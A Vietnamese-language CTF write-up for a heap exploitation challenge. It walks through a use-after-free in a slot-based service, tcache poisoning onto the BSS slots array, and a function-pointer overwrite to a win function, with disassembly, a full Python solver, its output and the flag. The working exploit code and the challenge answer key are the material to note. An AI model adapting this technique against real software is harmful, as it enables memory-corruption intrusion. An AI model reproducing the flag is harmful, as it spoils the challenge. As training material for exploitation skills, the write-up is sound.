# Writeup: PWN CHALLENGE 5 (NexusMind :: Prompt Cache Gateway — Tcache Poisoning & Control Flow Hijack)

> **Event:** DDC CTF  
> **Category:** PWN / Heap Exploitation  
> **Difficulty:** Medium  
> **Points:** 274  
> **Description:** *"Session Slots Are Cheap Because We Never Zero Pointers, and Pointers Are Cheap Because We Free Them Twice."*  
> **Host / Port:** `nc 172.31.102.101 10106`  
> **Flag:** `flag{27f045b4-b6cd-4397-942d-48c79b2bfea0}`

---

## 1. Tóm tắt (TL;DR)

1. Dịch vụ **NexusMind :: Prompt Cache Gateway v2.14** lắng nghe tại `nc 172.31.102.101 10106`.
2. Binary x86_64 ELF **No-PIE** (Base `0x400000`), chạy glibc với cơ chế quản lý heap **tcache** (bins cỡ nhỏ).
3. Chương trình quản lý 8 slots (`slots[0..7]`) trong mảng toàn cục tại vùng nhớ BSS (`0x404040`). Cấu trúc mỗi phần tử `slot` (kích thước 24 bytes = `0x18` bytes):
   ```c
   struct Slot {
       void (*emit_hook)(char *buf); // offset 0x00
       char *buf;                    // offset 0x08
       size_t size;                  // offset 0x10
   };
   ```
4. Khi giải phóng session buffer qua lệnh `clear <slot>`, hàm chỉ gọi `free(slot[i].buf)` mà **không gán con trỏ về NULL** (`slot[i].buf = NULL`) và **không xóa `emit_hook`** -> **Use-After-Free (UAF)**.
5. Người dùng vẫn có thể ghi đè dữ liệu vào chunk vừa giải phóng qua `write <slot> <n>` (**UAF Write**) và thực thi hook qua `print <slot>` (**UAF Read**).
6. Khai thác **Tcache Poisoning**:
   - `alloc 0 32`, `alloc 1 32` (cấp phát chunk 0x30 vào tcache).
   - `clear 0`, `clear 1` (đưa 2 chunk vào tcache bin `0x30`: `chunk1 -> chunk0`).
   - Dùng UAF Write trên slot 1: `write 1 8` ghi đè con trỏ `fd` của chunk 1 trỏ tới `0x404040` (vị trí mảng `slots[0]` trong BSS).
   - `alloc 2 32` lấy lại `chunk 1`.
   - `alloc 3 32` lấy về chunk tại địa chỉ BSS `0x404040`!
7. Qua `write 3 24`, ghi đè thông tin của `slots[0]`:
   - Ghi đè `slots[0].emit_hook` thành địa chỉ hàm **Win / Backdoor** bí mật trong binary tại `0x401451`.
8. Gọi `print 0`, chương trình nhảy vào `slots[0].emit_hook(slots[0].buf)`, thực thi hàm win đọc biến môi trường `FLAG` và in ra cờ:
   `flag{27f045b4-b6cd-4397-942d-48c79b2bfea0}`.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát giao diện & gợi ý từ đề bài

Kết nối vào cổng 10106:
```
=====================================
 NexusMind :: Prompt Cache Gateway  
 v2.14 (tcache-backed slot pool)    
=====================================
  alloc <slot> <size>    -- allocate a session buffer
  write <slot> <n>       -- write n raw bytes into slot's buffer
  print <slot>           -- render slot via its emit hook
  clear <slot>           -- free slot buffer
  quit                   -- close session
=====================================
prompt-cache> 
```

Đề bài mô tả:
> *"Session Slots Are Cheap Because We Never Zero Pointers, and Pointers Are Cheap Because We Free Them Twice."*

Mô tả chỉ rõ 2 điểm yếu chí mạng:
- **"We Never Zero Pointers"**: Lỗ hổng Use-After-Free (UAF) do con trỏ không được reset về 0 sau khi gọi `free()`.
- **"We Free Them Twice"**: Lỗ hổng Double Free trong tcache.

Kiểm tra số lượng slot hợp lệ:
- Thử các chỉ số: các slot từ `0` đến `7` hợp lệ (tổng cộng 8 slot). Kích thước tối đa cho `alloc` là `192` bytes (chunk size `<= 0xd0`).

---

### Bước 2: Khảo sát cấu trúc Slot & Vùng nhớ BSS

Bằng cách thử nghiệm các địa chỉ ghi đè tcache (tcache poisoning probe), ta xác định được:
- Binary hoàn toàn tắt PIE (**No-PIE**), nạp cố định tại `0x400000`.
- Vùng BSS bắt đầu từ `0x404000`.
- Mảng session slots nằm cố định tại `0x404040`.

Dump nội dung BSS xung quanh `0x404040` cho thấy cấu trúc mỗi slot:
```
0x404040: 0x00000000004013e0  <- slot[0].emit_hook (default emit hook)
0x404048: 0x000000002ce1c2a0  <- slot[0].buf (heap pointer)
0x404050: 0x0000000000000020  <- slot[0].size (32 bytes)

0x404058: 0x00000000004013e0  <- slot[1].emit_hook
0x404060: 0x000000002ce1c2d0  <- slot[1].buf
0x404068: 0x0000000000000020  <- slot[1].size
...
```

Mỗi slot có kích thước chính xác 24 bytes (`0x18`):
- `+0x00`: Con trỏ hàm `emit_hook`
- `+0x08`: Con trỏ bộ đệm `buf`
- `+0x10`: Kích thước `size`

---

### Bước 3: Phân tích mã máy (Reverse Engineering)

Sử dụng Capstone để dịch ngược mã máy trong vùng `.text`:

#### Hàm xử lý lệnh `print` (`0x4017d6`):
```assembly
0x4017e8: movsxd rdx, eax       ; rdx = slot index
0x4017eb: mov    rax, rdx
0x4017ee: add    rax, rax       ; rax = 2 * index
0x4017f1: add    rax, rdx       ; rax = 3 * index
0x4017f4: shl    rax, 3         ; rax = 24 * index (0x18 * index)
0x4017fb: lea    rax, [0x404040]; Địa chỉ mảng slots trong BSS
0x401802: mov    rax, [rdx+rax] ; Lấy emit_hook tại offset 0x00
0x401806: test   rax, rax       ; Kiểm tra emit_hook có NULL không
0x401809: jne    0x401819       ; Nếu khác NULL thì tiếp tục
...
0x401836: mov    rcx, [rdx+rax] ; rcx = slots[i].emit_hook
0x401857: mov    rax, [rdx+rax+8]; rax = slots[i].buf
0x40185b: mov    rdi, rax       ; rdi = slots[i].buf (tham số thứ nhất)
0x40185e: call   rcx            ; GỌI emit_hook(slot[i].buf)!
```

#### Hàm Win / Backdoor (`0x401451`):
```assembly
0x401451: endbr64
0x401455: push   rbp
0x401456: mov    rbp, rsp
0x401459: sub    rsp, 0x20
0x401461: lea    rdi, [0x4021aa] ; chuỗi "FLAG"
0x401468: call   getenv          ; getenv("FLAG")
0x40146d: mov    [rbp-8], rax
0x401471: cmp    qword ptr [rbp-8], 0
0x401476: jne    0x401483
0x401478: lea    rax, [0x4021b0] ; "flag{tcache_local_placeholder}"
0x40147f: mov    [rbp-8], rax
0x401483: lea    rdi, [0x4021d0] ; "::: --- NexusMind bounty gate opened ---"
0x40148a: call   puts
0x401493: mov    rdi, [rbp-8]    ; rdi = flag string
0x401496: call   puts            ; in cờ
0x4014a5: call   fflush
0x4014ac: ret
```

Hàm tại `0x401451` chính là mục tiêu! Chỉ cần điều khiển được `slots[i].emit_hook = 0x401451`, khi gọi `print i` sẽ in ra flag.

---

### Bước 4: Xây dựng chuỗi khai thác Tcache Poisoning

1. **Cấp phát:**
   - `alloc 0 32` -> chunk A
   - `alloc 1 32` -> chunk B

2. **Tạo danh sách tcache:**
   - `clear 0` -> đưa chunk A vào tcache bin 0x30 (`tcache: A -> NULL`)
   - `clear 1` -> đưa chunk B vào tcache bin 0x30 (`tcache: B -> A -> NULL`)

3. **Ghi đè UAF (Tcache Poisoning):**
   - Gọi `write 1 8` gửi payload `0x404040` (vị trí `slots[0]` trong BSS).
   - Vì chunk B đang ở đầu tcache, con trỏ `fd` (offset 0 trong user data) của chunk B bị ghi đè:
     `tcache: B -> 0x404040`

4. **Khai thác chunk trúng thưởng:**
   - `alloc 2 32` -> glibc trả về chunk B, tcache hiện tại còn `0x404040`.
   - `alloc 3 32` -> glibc trả về địa chỉ `0x404040`! Bộ đệm của `slot 3` giờ đây chính là `slots[0]` trong BSS!

5. **Ghi đè Function Pointer:**
   - Gọi `write 3 24`:
     ```python
     payload = p64(0x401451) + p64(0x404048) + p64(32)
     # payload tương ứng:
     # emit_hook = 0x401451 (win function)
     # buf       = 0x404048
     # size      = 32
     ```
   
6. **Thực thi:**
   - Gọi `print 0`.
   - Chương trình gọi `slots[0].emit_hook(slots[0].buf)` -> gọi trực tiếp `0x401451` -> Cờ được in ra ngay lập tức!

---

## 3. Mã khai thác (`solvers/solve_pwn5.py`)

```python
#!/usr/bin/env python3
import socket
import struct
import time
import sys
import re

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

HOST = '172.31.102.101'
PORT = 10106

def p64(v):
    return struct.pack('<Q', v)

def solve(host=HOST, port=PORT):
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((host, int(port)))

    time.sleep(0.1)
    banner = s.recv(4096).decode('utf-8', errors='replace')
    print("[*] Banner received:")
    print(banner.strip())

    # Step 1: Allocate slot 0 and slot 1
    print("[*] Step 1: Provisioning slots 0 and 1 (size 32)...")
    s.sendall(b'alloc 0 32\n'); time.sleep(0.05); s.recv(4096)
    s.sendall(b'alloc 1 32\n'); time.sleep(0.05); s.recv(4096)

    # Step 2: Clear slots 0 and 1 into tcache bin 0x30
    print("[*] Step 2: Freeing slots to populate tcache bin 0x30...")
    s.sendall(b'clear 0\n'); time.sleep(0.05); s.recv(4096)
    s.sendall(b'clear 1\n'); time.sleep(0.05); s.recv(4096)

    # Step 3: Poison tcache fd -> 0x404040 via UAF write on slot 1
    SLOTS_ARRAY_ADDR = 0x404040
    print(f"[*] Step 3: Poisoning tcache fd -> {hex(SLOTS_ARRAY_ADDR)} via UAF write...")
    s.sendall(b'write 1 8\n'); time.sleep(0.05)
    s.sendall(p64(SLOTS_ARRAY_ADDR) + b'\n'); time.sleep(0.05); s.recv(4096)

    # Step 4: Allocate slots 2 and 3 to acquire BSS chunk at 0x404040
    print("[*] Step 4: Allocating slots 2 and 3 to acquire BSS chunk at 0x404040...")
    s.sendall(b'alloc 2 32\n'); time.sleep(0.05); s.recv(4096)
    s.sendall(b'alloc 3 32\n'); time.sleep(0.05); s.recv(4096)

    # Step 5: Overwrite slots[0] metadata via slot 3
    WIN_FUNC = 0x401451
    print(f"[*] Step 5: Overwriting slots[0].emit_hook with win function ({hex(WIN_FUNC)})...")
    payload = p64(WIN_FUNC) + p64(0x404048) + p64(32)
    s.sendall(f'write 3 {len(payload)}\n'.encode()); time.sleep(0.05)
    s.sendall(payload + b'\n'); time.sleep(0.05); s.recv(4096)

    # Step 6: Trigger win function via print 0
    print("[*] Step 6: Triggering emit hook via 'print 0'...")
    s.sendall(b'print 0\n'); time.sleep(0.3)
    resp = s.recv(4096).decode('utf-8', errors='replace')
    s.close()

    print("[*] Service response:")
    print(resp.strip())

    m = re.search(r'flag\{[^}]+\}', resp)
    if m:
        flag = m.group(0)
        print(f"\n[+] SUCCESS! FLAG: {flag}\n")
        return flag
    else:
        print("[-] Flag pattern not found!")
        return None

if __name__ == '__main__':
    solve()
```

---

## 4. Kết quả & Flag

Chạy solver:
```bash
$ python solvers/solve_pwn5.py
[*] Connecting to 172.31.102.101:10106...
[*] Banner received:
=====================================
 NexusMind :: Prompt Cache Gateway  
 v2.14 (tcache-backed slot pool)    
=====================================
  alloc <slot> <size>    -- allocate a session buffer
  write <slot> <n>       -- write n raw bytes into slot's buffer
  print <slot>           -- render slot via its emit hook
  clear <slot>           -- free slot buffer
  quit                   -- close session
=====================================
prompt-cache>
[*] Step 1: Provisioning slots 0 and 1 (size 32)...
[*] Step 2: Freeing slots to populate tcache bin 0x30...
[*] Step 3: Poisoning tcache fd -> 0x404040 via UAF write...
[*] Step 4: Allocating slots 2 and 3 to acquire BSS chunk at 0x404040...
[*] Step 5: Overwriting slots[0].emit_hook with win function (0x401451)...
[*] Step 6: Triggering emit hook via 'print 0'...
[*] Service response:
::: --- NexusMind bounty gate opened ---
flag{27f045b4-b6cd-4397-942d-48c79b2bfea0}
prompt-cache>

[+] SUCCESS! FLAG: flag{27f045b4-b6cd-4397-942d-48c79b2bfea0}
```

Flag:
```
flag{27f045b4-b6cd-4397-942d-48c79b2bfea0}
```
